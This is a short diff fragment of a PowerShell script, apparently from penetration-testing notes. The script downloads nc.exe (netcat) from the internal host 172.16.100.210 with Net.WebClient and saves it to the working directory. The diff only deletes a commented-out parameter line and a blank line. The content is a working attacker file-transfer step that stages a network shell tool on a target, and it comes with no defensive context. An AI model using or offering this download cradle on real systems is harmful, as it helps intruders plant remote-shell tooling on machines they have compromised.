@@ -89,12 +89,9 @@ powershell 2
    
 $url = "http://172.16.100.210/nc.exe" 
 $path = "nc.exe" 
-# param([string]$url, [string]$path) 
-
 if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
 $targetFile = Join-Path $pwd (Split-Path -leaf $path) 
 } 
-
 (New-Object Net.WebClient).DownloadFile($url, $path) 
 $path
 
